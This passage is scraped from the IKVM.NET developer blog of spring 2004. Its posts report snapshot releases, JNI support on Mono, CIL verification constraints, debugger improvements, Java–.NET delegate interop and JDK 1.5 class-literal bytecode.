JNIEXPORT void JNICALL Java_test_nativeMethod(<BR>                   JNIEnv* env, jclass clazz) {
  printf("Hello from JNI\n");
}</PRE></LI>
<LI>gcc -shared test.c -o libtest.so</LI>
<LI>export LD_LIBRARY_PATH=.</LI>
<LI>ikvm test</LI></UL>
<P>New snapshots: <A href="http://www.frijters.net/ikvmbin.zip"><STRONG>just the binaries</STRONG></A> and <A href="http://www.frijters.net/ikvm.zip"><STRONG>source plus binaries</STRONG></A>.</P>
<P>The GNU Classpath release that this is based on can be downloaded from <A href="ftp://ftp.gnu.org/pub/gnu/classpath/classpath-0.09.tar.gz">ftp://ftp.gnu.org/pub/gnu/classpath/classpath-0.09.tar.gz</A></P>
<P>Note that anon cvs for SourceForge is apparently still lagging behind, so at the moment I'm posting this, anon cvs does not yet contain the latest changes.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/05/2004 11:06:43 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=1cdd1023-accb-41ee-95aa-c61feac854a2"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=1cdd1023-accb-41ee-95aa-c61feac854a2">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 15 April 2004</h2></div>
<div class="newsItems"><a name="af6763ea7-5c93-4408-9c72-719f587f9445"></a><div class="entry">
	<h3 class="entryTitle">Progress</h3>
	<div class="entryBody">
		<P>While it's been quiet on the blog and the mailing list, there has been quite a lot of progress behind the scenes.</P>
<UL>
<LI>The next Mono release will contain the C half of the IKVM JNI provider and the next IKVM snapshot will contain the C# half of the Mono JNI provider. This means that JNI will work out of the box on Mono (for the parts of JNI that are actually implemented). Thanks to Zoltan and Miguel for this.</LI>
<LI>I'm planning an IKVM 0.8 release to coincide with the Mono 1.0 release.</LI>
<LI>John Luke added IKVM support to MonoDevelop. Read about it <A href="http://www.advogato.org/person/jluke/diary.html?start=5">here</A> or see the screenshot <A href="http://helios.acomp.usf.edu/~luke/md-java-ikvm.png">here</A>.</LI>
<LI>I successfully started up Eclipse 3.0 M8 for the first time yesterday. Thanks to Michael Koch for his work on GNU Classpath's java.nio implementation and all the other GNU Classpath hackers, of course.</LI>
<LI>In the comments, Jesus Garcia point me to <A href="http://swingwt.sourceforge.net/">SwingWT</A>. An SWT based implementation of AWT and Swing by Robin Rawson-Tetley. Very cool stuff! It doesn't run on the latest snapshot due to a JNI bug, but I have it running and it's very cool to see the <A href="http://www.frijters.net/swingset.png">SwingSet demo running on IKVM</A>.</LI></UL>
<P>I hope to do a new snapshot in the first week of May and after that to work towards the 0.8 release.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		04/15/2004 10:06:15 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=f6763ea7-5c93-4408-9c72-719f587f9445"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=f6763ea7-5c93-4408-9c72-719f587f9445">Comments [4]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 29 March 2004</h2></div>
<div class="newsItems"><a name="aee8551b5-176a-4de2-9c1d-9670c218c1ad"></a><div class="entry">
	<h3 class="entryTitle">Backward Branch Constraints</h3>
	<div class="entryBody">
		<P>The last snapshot was totally broken on Mono (*blush*). My apologies to the Mono users. I should test my snapshots on Mono before releasing them, but I'm lazy so this sometimes slips through the cracks.</P>
<P>The breakage was kind of interesting though. As I wrote last time, I rewrote the bytecode compiler to emit CIL in the same order as the Java bytecode. This caused invalid (per the ECMA spec) CIL to be generated in some cases. The interesting thing is that the code isn't <I>really </I>invalid, the only reason it is invalid is because the spec says so:</P>
<P><I>Partition III -- 1.7.5 Backward Branch Contraints</I></P>
<P><I>It must be possible, with a single forward-pass through the CIL instruction stream for any method, to infer the exact state of the evaluation stack at every instruction (where by &#8220;state&#8221; we mean the number and type of each item on the evaluation stack).</I></P>
<P><I>In particular, if that single-pass analysis arrives at an instruction, call it location X, that immediately follows an unconditional branch, and where X is not the target of an earlier branch instruction, then the state of the evaluation stack at X, clearly, cannot be derived from existing information. In this case, the CLI demands that the evaluation stack at X be empty.</I></P>
<P>(Note that the section numbering seems to change with each version, this is from the working draft of June 2003.)</P>
<P>Java bytecode has no such requirment, so my straight forward translation caused Java bytecode that is only reachable through a backward branch to be translated into invalid CIL.</P>
<P>The Microsoft verifier and JIT don't require this constraint to be met and they will happily verify and JIT code that violates this constraint. However, the Mono JIT relies on it and so it was unable to handle some of the CIL that IKVM generated.</P>
<P>I fixed the IKVM bytecode compiler to emit ECMA compliant code (at least for this particular issue, who knows what else is wrong). I also fixed exception mapping, which didn't work on Mono as it relied on a currently unimplemented feature (I think, I didn't really investigate).</P>
<P>I think that, realistically, the Mono JIT will also have to be "fixed" to support the broken code, as you can be sure that there will be compilers that emit broken code, because it works on the Microsoft runtime.</P>
<P>New snapshots: <A href="http://www.frijters.net/ikvmbin.zip"><STRONG>just the binaries</STRONG></A> and <A href="http://www.frijters.net/ikvm.zip"><STRONG>source plus binaries</STRONG></A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/29/2004 12:56:28 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=ee8551b5-176a-4de2-9c1d-9670c218c1ad"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=ee8551b5-176a-4de2-9c1d-9670c218c1ad">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 26 March 2004</h2></div>
<div class="newsItems"><a name="a17ca4e8d-f65e-4aab-b7c8-89cccbcb0b48"></a><div class="entry">
	<h3 class="entryTitle">Debugging Support</h3>
	<div class="entryBody">
		<P>I finished and fixed the local variable analysis and made various improvements to the debugging experience (in Visual Studio .NET). In the process I discovered some quirks in jikes' debugging tables. It associates two line numbers with the same bytecode address when that bytecode address is also the start of an exception block. It also (I think incorrectly) starts a local variable scope before the store instruction that first initializes that local variable. Javac starts the local variable scope immediately after the first store to that local, this makes more sense to me, but also required a hack in the local variable debugging support to make sure that the IL variable scope starts at the right position (i.e. before the first store to that local variable).</P>
<P>To make local variable scopes work, I had to change the bytecode compiler to emit IL in the same order as the original Java bytecode. For some reason I originally wrote the compiler to do the same code flow analysis as the verifier and this resulted in a somewhat arbitrary order of the generated IL. I finally fixed that and I also removed the recursion from the compiler (it now uses an explicit stack to keep track of exception blocks).</P>
<P>Note that unreachable code is still not compiled (it can't be verified, so it can't be compiled), but there will be nop IL instructions for each unreachable bytecode instruction, so you can set breakpoints and move the instruction pointer there. This could be a bit confusing and I probably should fix it at some point (by not emitting the nops).</P>
<P>I also had to reintroduce the automatic downcasting of locals, because I realised that it is possible to write bytecode by hand that depends on this (Java source will never require it). In non-debug builds of classpath.dll this introduces 12 (unnecessary) downcasts, so that's not really worth optimising.</P>
<P>What's new?</P>
<UL>
<LI>When compiling with -debug option, dead store are not optimized out anymore.</LI>
<LI>When compiling with -debug option, local variables are merged based on LocalVariableTable information.</LI>
<LI>When compiling with -debug option, the first instruction of a method will always (except when compiling with -Xmethodtrace) have an associated line number now (to enable stepping into the method).</LI>
<LI>When compiling with -debug option, local variables are now scoped based on LocalVariableTable information. Different locals with the same name are now handled correctly in the debugger.</LI>
<LI>Made helper method MethodInfo caching more consistent.</LI>
<LI>Method arguments that are value types are now boxed on method entry and not on each individual load, this makes them behave consistent with local variables.</LI>
<LI>Reusing method argument local variable slots (with different types) is now fully supported. I've never seen a Java compiler do this, but it is legal.</LI>
<LI>lookupswitch/tableswitch branches into exception blocks are now handled correctly (exception block is split around branch target). This completes branch/exception block handling. I originally thought that this would never happen, but apparently it does.</LI>
<LI>Added a helper method to emit Ldc_I4 that always uses the optimal encoding.</LI>
<LI>Added a class loader check to the System.arraycopy optimization check, to make sure that we're in fact calling System.arraycopy on the bootstrap version of java.lang.System.</LI>
<LI>Many fixes to the local variable analysis.</LI>
<LI>Added -srcpath option to ikvmc. If specified, this prepends the specified path and the package name to the source file name in the debugging information. In most cases this will be the correct location for the source file and will allow the debugger to automatically load the correct source.</LI>
<LI>Added AWT peer for Window.</LI></UL>
<P>New snapshots: <A href="http://www.frijters.net/ikvmbin.zip"><STRONG>just the binaries</STRONG></A> and <A href="http://www.frijters.net/ikvm.zip"><STRONG>source plus binaries</STRONG></A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/26/2004 11:30:36 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=17ca4e8d-f65e-4aab-b7c8-89cccbcb0b48"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=17ca4e8d-f65e-4aab-b7c8-89cccbcb0b48">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 25 March 2004</h2></div>
<div class="newsItems"><a name="a01588455-4115-4f66-b5d0-0f5c19b630fb"></a><div class="entry">
	<h3 class="entryTitle">Q & A</h3>
	<div class="entryBody">
		<P>In the comments on the previous entry, Stuart asks:</P>
<P><I>Given an instance of System.Type, how do I determine what the typename is in Java?</I></P>
<P>This is tricky and my (lame) answer is that you shouldn't have to. Do you have a specific scenario in mind? Having said that, in your comment you're on the right track, there is no one-to-one mapping between System.Type instances and java.lang.Class instances. What I think you're after is the fact that you'll never encounter cli.System.Object or cli.System.Exception as field types or in method signatures. The only way to get the class object for these types, is by calling getClass() on an instance or by calling Class.getSuperclass() on a subclass of them.</P>
<P>Note that the above behaviour isn't actually implemented yet. At the moment cli.System.Object and cli.System.Exception are simply helper classes with static methods and you'll never encounter them as field types, in method signatures or as instance types.</P>
<P>As to which one to use from Java, you're right when you say java.lang.* is the answer is most cases. The only times you want to use cli.System.Object or cli.System.Exception is when you subclass them from Java to make your Java class look more .NET like to .NET consumers.</P>
<P><I>What would be really nice would be if there were something in the IK.VM.NET.dll that would let me answer this question authoritatively with a simple call...</I></P>
<P>There is the NativeCode.java.lang.VMClass.getClassFromType() method that is used by the runtime internally (it's public, so you could call it), but I can't really guarantee that it'll stay around or behave consistently over time. At some point in the future there'll probably be a utility class in the ikvm.lang package that will contain conversion method to go from System.Type to java.lang.Class and vice versa (but it probably will require you to specify to context for the mapping).</P>
<P><I>Oh, one other thing that occurred to me would be a nice feature: if a class implemented in Java could put itself into the cli.* package and thereby make itself look to other Java code as if it were a .NET type, without actually putting it in a cli.* namespace in .NET. In other words, a Java class cli.Foo.Bar would be compiled as namespace Foo.Bar *without* the attribute that preserves its name in Java, so that Foo.Bar then gets translated back to cli.Foo.Bar when Java code sees it. <BR><BR>Sort of the inverse of the attribute for turning name mangling off on the .NET side.</I></P>
<P>Can you explain why and when you'd want to use this?</P>
<P>Mike asks:</P>
<P><I>Are there any tasks for a CS scrub like myself to work on with IKVM?</I></P>
<P>Here is a partial list of things that need to be done:</P>
<UL>
<LI>Implement the AWT peers</LI>
<LI>Implement the missing JNI methods</LI>
<LI>Build a framework to test the verifier / bytecode compiler</LI>
<LI>Write a Java implementation of String.valueOf(float) and String.valueOf(double)</LI>
<LI>Search the source for // TODO for things that seem doable (or write test cases that show the current code is broken)</LI>
<LI>Write documentation</LI>
<LI>Design a logo</LI>
<LI>Design a website</LI></UL>
<P>If you (or anyone) decides to work on something, please send e-mail to the <A href="http://lists.sourceforge.net/lists/listinfo/ikvm-developers">ikvm-developers list</A>, so we can coordinate.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/25/2004 10:28:51 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=01588455-4115-4f66-b5d0-0f5c19b630fb"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=01588455-4115-4f66-b5d0-0f5c19b630fb">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Saturday, 20 March 2004</h2></div>
<div class="newsItems"><a name="a941954d7-d265-44c6-b326-027a22efcd12"></a><div class="entry">
	<h3 class="entryTitle">Documentation</h3>
	<div class="entryBody">
		<P>Miguel <A href="http://primates.ximian.com/~miguel/archive/2004/Mar-18.html"><STRONG>posted a nice example</STRONG></A> of how to use Gtk# from Java using IKVM/Mono on his blog. In response Pablo posted a question to the Mono list and Jonathan Pryor <A href="http://archive.neotonic.com/archive/mono-list/messages/18950?noheader=1"><STRONG>replied</STRONG></A> with a nice explanation of how delegates are handled to the IKVM and Mono lists (quoted with permission, slightly edited):</P><PRE>From: Jonathan Pryor
Sent: Friday, March 19, 2004 02:35
To: Pablo Baena
Cc: Miguel de Icaza; mono-list@lists.ximian.com; ikvm-developers@lists.sourceforge.net
Subject: Re: [Mono-list] Java and C#

Below...

On Thu, 2004-03-18 at 16:07, Pablo Baena wrote:
&gt; Miguel: I saw your blog about IKVM. One thing I haven't been able to 
&gt; investigate is, how useful can be Gtk# with Java. Because, for example, I 
&gt; couldn't find a clue on how to attach a Java 'listener' to a C# event, or any 
&gt; way to use attributes in Java.

They really need to document this better...

However, grepping through the ikvm.zip file (from their website), we
see:

// file: classpath/java/lang/VMRuntime.java
cli.System.AppDomain.get_CurrentDomain().add_ProcessExit (
  new cli.System.EventHandler (
    new cli.System.EventHandler.Method () {
      public void Invoke (Object sender, cli.System.EventArgs e) {
        Runtime.getRuntime().runShutdownHooks();
      }
    }
  )
);

&gt;From this (and prior knowledge), we can draw the following statements:

1. Properties are actually functions with `get_' and `set_' prefixed to
them. Thus C# property System.AppDomain.CurrentDomain is the static
Java function cli.System.AppDomain.get_CurrentDomain().

2. Events are actually functions with `add_' and `remove_' prefixed to
their name. Thus C# event System.AppDomain.ProcessExit is the static
Java function cli.System.AppDomain.add_ProcessExit().

3. There is no equivalent to C# delegates in Java, so these are
translated into a class + interface pair. The EventHandler class is the
standard C# type name (cli.System.EventHandler), which takes as an
argument an interface to invoke, named "cli." + C# delegate type name +
".Method", hence cli.System.EventHandler.Method. The EventHandler.Method
interface has a function Invoke() which must be implemented, and this
method will be invoked when the event is signaled.

I suspect that there is no way to add attributes in Java. Microsoft's
Visual J# permits the use of Attributes (IIRC), but it's through their
Visual J++ syntax -- through a specially formed JavaDoc comment. 
Something like (from memory):

/**
* @attribute-name (args...)
*/
public void myMethod () {/* ... */}

Of course, that's compiler specific, and no standard Java compiler will
support that. So when it comes to attributes, you're probably up the
creek.

- Jon
</PRE>
<P>I <A href="http://archive.neotonic.com/archive/mono-list/messages/18957?noheader=1"><STRONG>replied</STRONG></A> saying that I believe that the attribute construct in JDK 1.5 can probably be used to expose .NET attributes to Java (and use them in Java code that is target to run on IKVM).</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/20/2004 14:51:08 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=941954d7-d265-44c6-b326-027a22efcd12"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=941954d7-d265-44c6-b326-027a22efcd12">Comments [3]</a>
		
		<br clear="all">
	</div>
</div><a name="a2ade29c7-1995-4649-90a2-fbce44ccec64"></a><div class="entry">
	<h3 class="entryTitle">A Less Broken Snapshot?</h3>
	<div class="entryBody">
		In Tuesday's snapshot, ikvmc was completely broken. Sorry about that. The CoreClasses cache introduced an incorrect dependency between Object, Throwable and String. This caused Throwable or String to be loaded while it was being loaded and that resulted in an exception: System.ArgumentException: Item has already been added. Key in dictionary: "java.lang.Throwable" Key being added: "java.lang.Throwable" 
<P>Hopefully this snapshot will be a little better quality, but don't hold your breath, because the main change in this version is the addition of local variable liveness analysis to the verifier. This required some tricky code and made it clear to me (again) that the verifier desperately needs to be rewritten.</P>
<P>The trigger for the local variable liveness analysis was to be able to emit debugging information for local variables, but it also has the nice side effect of allowing a little better code generation. Previously, if a local variable slot was shared between two different reference types, the .NET local would have the type of the common base type, even if the uses were in fact totally distinct. The compiler had to emit downcasts whenever it emitted a load from one of those locals. In classpath.dll there were 1288 such downcasts. With the new liveness information, it is now possible to split those Java locals in multiple .NET locals, so these downcasts are now gone. Another optimization, which doesn't seem all that exciting, is the elimination of dead stores to local variables. In itself this is a fairly pointless optimization, because the CLR/Mono JIT will probably do it anyway. However, there is one very important optimization that can be done because of dead store elimination, in exception handling. Whenever an exception handler discards the exception object and the IKVM bytecode compiler can detect this, it can skip the (expensive) stack trace capturing that is normally required. I had already hacked some support to recognize these exception handlers (in classpath.dll there were 313 optimized exception handlers), but now it works much better (there are now 444 optimized exception handlers).</P>
<P>What's new?</P>
<UL>
<LI>Decorated the various ByteCodeHelper methods with the [<A href="http://msdn.microsoft.com/library/en-us/cpref/html/frlrfsystemdiagnosticsdebuggerstepthroughattributeclasstopic.asp">DebuggerStepThroughAttribute</A>] attribute to make stepping through the source code in the debugger less disruptive. 
<LI>Restored the signature decoding methods in ClassFile.cs that I removed in the previous version. I had failed to realise that they're different from the ones in ClassLoaderWrapper, because they deal with unloadable classes. 
<LI>Fixed CoreClasses to decouple the different classes (accessing one no longer triggers loading the others). 
<LI>Changed handling of package accessible final fields (they're no longer turned into a property). 
<LI>Fixed System.setOut (copy &amp; paste mistake, it tried to set "in"). 
<LI>The debugging information is now classified as Java/Text. Not sure if this affects anything, but it seemed like the right thing to do. 
<LI>Fixed debugging line number information to make sure the firt CIL instruction has a corresponding line number. Previously, Visual Studio .NET refused to step into an ikvmc compiled method. 
<LI>Optimized dead stores to local variables and use new dead store information to optimize exception handling. 
<LI>Local variables are now properly typed and have their names attached in debugging information (when ikvmc with the -debug option is used). NOTE: if the same variable name is reused in a method, the debugging information for those variables is not yet emitted correctly. 
<LI>Fixed mapping of System.IntPtr to gnu.classpath.RawData. The mapping is now private to classpath.dll. 
<LI>Changed JVM.CriticalFailure to write to always write to stderr on Unix instead of try to display a message box. 
<LI>Fixed race condition between returning from Thread.join and the thread being removed from the thread pool / marked as dead. 
<LI>Fixed Thread.yield to not consume thread interrupted status. (Note that Thread.sleep(0) behaves as Thread.yield() and also does not consume the interrupted status).</LI></UL>
<P>New snapshots: <A href="http://www.frijters.net/ikvmbin.zip"><STRONG>just the binaries</STRONG></A> and <A href="http://www.frijters.net/ikvm.zip"><STRONG>source plus binaries</STRONG></A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/20/2004 14:26:49 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=2ade29c7-1995-4649-90a2-fbce44ccec64"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=2ade29c7-1995-4649-90a2-fbce44ccec64">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 16 March 2004</h2></div>
<div class="newsItems"><a name="a99622c93-1cc3-4cb4-beea-82f0b74d423b"></a><div class="entry">
	<h3 class="entryTitle">New Snapshot</h3>
	<div class="entryBody">
		<P>Last week I said I'd go through a stabilization phase, but I couldn't resist the urge to implement some more stuff and fix various things. So this snapshot is a fairly big change again, but no major architectural overhaul like the pervious one.</P>
<P>What's new?</P>
<UL>
<LI>Merged with current Classpath cvs.</LI>
<LI>Support for JDK 1.5 style class literals (only for class files with version 49 or greater).</LI>
<LI>Removed signature decoding from ClassFile.cs (I once thought that it should live there, instead of in ClassLoaderWrapper, but that turned out not to be a good idea).</LI>
<LI>Added CoreClasses.cs to cache a few of the frequently used TypeWrappers (Object, Class, String and Throwable).</LI>
<LI>Fixed volatile long/double handling to use the (new in .NET 1.1) Thread.VolatileRead/VolatileWrite methods.</LI>
<LI>Changed type used in ImplementsAttribute to the ghost wrapper for ghosts.</LI>
<LI>Changed method name mangling for interface implementation stubs (shorter name and now uses a slash to make sure it doesn't clash with any Java method names).</LI>
<LI>Added support for Finalize/finalize method overriding when mixing Java and non-Java classes in the class hierarchy. I don't like this solution very much. The code is ugly and complicated.</LI>
<LI>Added special support for finalize method for .NET types that extend Java types.</LI>
<LI>Fixed handling of synchronized static methods. Previously, .NET MethodImplOptions.Synchronized flag was simply set, but this was incorrect because that causes the method to synchronize on the .NET Type object, instead of the Java Class object.</LI>
<LI>Fixed handling of instance calls on value types.</LI>
<LI>Fixed System.currentTimeMillis implementation to use DateTime.UtcNow instead of Environment.TickCount, to prevent overflow.</LI>
<LI>Changed System.setErr/setIn/setOut to use TypeWrapper based reflection instead of .NET reflection.</LI>
<LI>Changed handling of resources to use .NET resources instead of global fields, this allows resources to work in multi-module assemblies.</LI>
<LI>Changed URL format for assembly embedded resources from opaque to parseable, to facilitate parsing them as a URI.</LI>
<LI>Added support for passing ghost references to methods in map.xml instructions.</LI>
<LI>Fixed a regression introduced in the previous snapshot, that caused exception mapping not to be invoked for catch(Throwable).</LI>
<LI>Limited fixes to get AWT working again (after Classpath AWT changes).</LI>
<LI>Declared String.equals and String.compareTo(Object) in map.xml to make reflection appearance identical to JDK.</LI>
<LI>Implemented JDK 1.4 String methods that rely on regular expressions (Classpath now has java.util.regex.* support, although not 100% compatible with the JDK).</LI>
<LI>Minor performance improvement in String.hashCode implementation. Oddly enough, by doing the length check in the for condition, instead of manually hoisting it out of the loop. Apparantly the CLR JIT recognizes this pattern and optimizes it better.</LI>
<LI>Fixed Thread.join to work with non-Java created threads as well.</LI>
<LI>Fixed removal of non-Java created threads from ThreadGroup.</LI>
<LI>Fixed ServerSocket.accept() timeout support.</LI>
<LI>Fixed ikvmc handling of -reference assemblies (to handle the Load vs LoadFrom context issues).</LI>
<LI>Various comment fixes.</LI></UL>
<P>New snapshots: <A href="http://www.frijters.net/ikvmbin.zip"><STRONG>just the binaries</STRONG></A> and <A href="http://www.frijters.net/ikvm.zip"><STRONG>source plus binaries</STRONG></A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/16/2004 17:50:55 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=99622c93-1cc3-4cb4-beea-82f0b74d423b"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=99622c93-1cc3-4cb4-beea-82f0b74d423b">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Saturday, 13 March 2004</h2></div>
<div class="newsItems"><a name="abe215eac-9929-4da3-8d20-ff009c39675e"></a><div class="entry">
	<h3 class="entryTitle">JDK 1.5 beta</h3>
	<div class="entryBody">
		<P>Yesterday I looked at the JDK 1.5 beta that Sun released recently. There appears not to be a complete list of changes to the VM yet and the only things I found were a few new modifier bits (that haven't yet stabilized) and the fact that class literals are <B>finally</B> supported in the VM. This is important for IKVM.NET, because it makes class literals in statically compiled code work better and more efficient.</P>
<P>For a quick refresher of how class literals are currently compiled, let's look at how the following class is compiled:</P><PRE>class ClassLiteral
{
  public static void main(String[] args)
  {
    System.out.println(String.class);
  }
}</PRE>
<P>Compiling this with Jikes 1.19 and then disassembling it (I've left out the default constructor that the compiler generated):</P><PRE>class ClassLiteral extends java/lang/Object

static java/lang/Class class$java$lang$String
// Unknown attribute : Synthetic//

public static main([Ljava/lang/String;)V
// attrib length: 53
// max stacks: 3
// max locals: 1
// code length: 25
0 getstatic &lt;Field java/lang/System java/io/PrintStream out&gt;
3 getstatic &lt;Field ClassLiteral java/lang/Class class$java$lang$String&gt;
6 dup
7 ifnonnull 21
10 pop
11 ldc "[Ljava.lang.String;"
13 iconst_0
14 invokestatic &lt;Method ClassLiteral class$(Ljava/lang/String;Z)Ljava/lang/Class;&gt;
17 dup
18 putstatic &lt;Field ClassLiteral java/lang/Class class$java$lang$String&gt;
21 invokevirtual &lt;Method java/io/PrintStream println(Ljava/lang/Object;)V&gt;
24 return

static class$(Ljava/lang/String;Z)Ljava/lang/Class;
// Unknown attribute : Synthetic
//
// attrib length: 55
// max stacks: 3
// max locals: 4
// code length: 23
0 aload_0
1 invokestatic &lt;Method java/lang/Class forName(Ljava/lang/String;)Ljava/lang
/Class;&gt;
4 iload_1
5 ifne 11
8 invokevirtual &lt;Method java/lang/Class getComponentType()Ljava/lang/Class;&gt;

11 areturn
12 new java/lang/NoClassDefFoundError
15 dup_x1
16 invokespecial &lt;Method java/lang/NoClassDefFoundError &lt;init&gt;()V&gt;
19 invokevirtual &lt;Method java/lang/Throwable initCause(Ljava/lang/Throwable;)
Ljava/lang/Throwable;&gt;
22 athrow
Exception table:
start_pc = 0
end_pc = 12
handler_pc = 12
catch_type = java/lang/ClassNotFoundException</PRE>
<P>The amount of code generated is pretty bizarre. Note that this isn't Jikes' fault, there just isn't a way to do it better. Now, here is what it looks like compiled with javac from the 1.5 beta (specifying the <EM>-target 1.5</EM> option):</P><PRE>class ClassLiteral extends java/lang/Object

public static main([Ljava/lang/String;)V
// attrib length: 38
// max stacks: 2
// max locals: 1
// code length: 10
0 getstatic &lt;Field java/lang/System java/io/PrintStream out&gt;
3 ldc_w java/lang/String
6 invokevirtual &lt;Method java/io/PrintStream println(Ljava/lang/Object;)V&gt;
9 return</PRE>
<P>This looks a lot better! No new bytecode instruction was added, instead the ldc instruction was modified to allow referencing a <CODE><A href="http://java.sun.com/docs/books/vmspec/2nd-edition/html/ClassFile.doc.html#1221"><STRONG>CONSTANT_Class_info</STRONG></A></CODE> . When the VM encounters this it loads the class and pushes the class object on the stack. I added support for this to IKVM.NET (not in cvs yet) in&nbsp;about 15 minutes. When JDK 1.1 was released (the first version to support class literals in the source), I wondered why they didn't add VM support at the same time, but fortunately they finally got around to it.</P>
<P><B>Trivia</B></P>
<P>If you looked closely at the Jikes generated code, you may have noticed that Jikes actually loads the string array class ("[Ljava.lang.String;") instead of java.lang.String. Why does it do this? It does this, because it correctly implements the JLS. The JLS says that class literals should not cause a class to be initialized. Doing a Class.forName() initializes the class, but when you initialize an array class you don't initialize the component type class. So this is a clever trick. Javac doesn't do this, so it (incorrectly) causes the class to be initialized.</P>
<P><B>IKVM.NET</B></P>
<P>Why does this change help statically compiled code in IKVM.NET? Performance is&nbsp;a bit&nbsp;better, but that's not the most important difference. The real benefit shows up when you statically compile code into multiple assemblies. If one assembly references a class in another assembly via a class literal, you'd better be sure that the referenced assembly is already loaded in the AppDomain, otherwise the IKVM.NET runtime is unable to find the class. In the new (JDK 1.5) way of references class literals, it is no longer opaque to ikvmc, so it can now compile the construct in such a way that the class literal causes the appropriate assembly to be loaded by the .NET runtime when it is executed.</P>
<P><B>StringBuilder</B></P>
<P>Something that struck me a funny is the new StringBuilder class that JDK 1.5 includes. It's almost identical to StringBuffer, except that it is not thread safe. If you look at the Rotor source code, you can see that the .NET StringBuilder also started life as StringBuffer. Now if the next version of .NET includes a thread safe version of StringBuilder and name it StringBuffer, we've come full circle ;-)</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/13/2004 18:38:45 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=be215eac-9929-4da3-8d20-ff009c39675e"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=be215eac-9929-4da3-8d20-ff009c39675e">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 10 March 2004</h2></div>
<div class="newsItems"><a name="a07bca016-be8a-4174-878f-e451243c0ff9"></a><div class="entry">
	<h3 class="entryTitle">To Invert Or Not To Invert</h3>
	<div class="entryBody">
